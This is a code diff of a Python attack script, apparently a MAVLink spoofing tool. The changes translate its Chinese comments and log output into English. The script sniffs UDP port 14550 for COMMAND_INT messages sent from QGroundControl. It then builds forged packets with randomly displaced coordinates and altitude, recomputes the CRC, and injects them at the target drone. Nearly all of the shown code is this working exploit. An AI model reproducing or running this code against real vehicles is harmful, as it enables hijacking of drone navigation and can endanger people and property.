@@ -98,7 +98,7 @@ def handle_packet(pkt):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(forged, (target_ip, target_port))
     sock.close()
-    print(f"[ATTACK] 已发送伪造 COMMAND_INT（索引 {last_used_index}）")
+    print(f"[ATTACK] sends COMMAND_INT（index {last_used_index}）")
 
     # Step 2: 提取原始坐标
     lat_real = struct.unpack('<i', data[-18:-14])[0] / 1e7
@@ -112,11 +112,11 @@ def handle_packet(pkt):
     alt_fake = struct.unpack('<f', xyz[8:12])[0]
     drift = haversine(lat_real, lon_real, lat_fake, lon_fake)
 
-    print(f"[INFO] 原始坐标 lat={lat_real:.7f}, lon={lon_real:.7f}, alt={alt_real:.2f} m")
-    print(f"[INFO] 伪造坐标 lat={lat_fake:.7f}, lon={lon_fake:.7f}, alt={alt_fake:.2f} m")
-    print(f"[INFO] 偏移距离：{drift:.2f} 米")
+    print(f"[INFO] original lat={lat_real:.7f}, lon={lon_real:.7f}, alt={alt_real:.2f} m")
+    print(f"[INFO] fake lat={lat_fake:.7f}, lon={lon_fake:.7f}, alt={alt_fake:.2f} m")
+    print(f"[INFO] distance：{drift:.2f} meters")
 
-    # Step 4: 精准替换 x/y/z 字段（保留 payload 结构完整）
+    # Step 4: 替换 x/y/z 字段（保留 payload 结构完整）
     old = forged
     magic = old[:1]
     body = old[1:-2]   # header + payload（不含原 CRC）
@@ -132,13 +132,13 @@ def handle_packet(pkt):
     crc = x25_crc(body_new, crc_extra)
     crc_bytes = struct.pack('<H', crc)
 
-    # Step 6: 正确构造伪造包
+    # Step 6: 构造伪造包
     forged_new = magic + body_new
     forged_new = forged_new + crc_bytes  # 用新CRC覆盖原来的
 
     payload_pool[last_used_index] = forged_new
 
-    # Step 7: 用固定基准坐标生成新的伪造坐标
+    # Step 7: 生成新的伪造坐标
     x_new = x_orig + random.randint(-max_lat_offset, max_lat_offset)
     y_new = y_orig + random.randint(-max_lon_offset, max_lon_offset)
     z_new = random.uniform(0, 25)
@@ -148,20 +148,20 @@ def handle_packet(pkt):
         struct.pack('<f', z_new)
     )
 
-    # Step 8: 打印池
-    print("[POOL] 当前伪造数据池内容：")
+    # Step 8: waiting pool
+    print("[POOL] waiting for sending：")
     for idx, pkt in enumerate(payload_pool):
         lat = struct.unpack('<i', pkt[-18:-14])[0] / 1e7
         lon = struct.unpack('<i', pkt[-14:-10])[0] / 1e7
         alt = struct.unpack('<f', pkt[-10:-6])[0]
-        print(f"  [索引 {idx}] lat={lat:.7f}, lon={lon:.7f}, alt={alt:.2f}m | 包头: {pkt.hex()[:20]}...")
+        print(f"  [index {idx}] lat={lat:.7f}, lon={lon:.7f}, alt={alt:.2f}m | packet: {pkt.hex()[:20]}...")
     print("-" * 60 + "\n")
 
     # Step 9: 循环索引
     last_used_index = (last_used_index + 1) % 5
 
 # ==== 启动监听 ====
-print("[INFO] 攻击监听启动，等待 QGC 发送 COMMAND_INT...")
+print("[INFO] Monitoring，waiting QGC to send COMMAND_INT...")
 sniff(
     iface=interface,
     filter="udp port 14550",
@@ -169,4 +169,5 @@ sniff(
     lfilter=is_command_int,
     store=0
 )
+
 
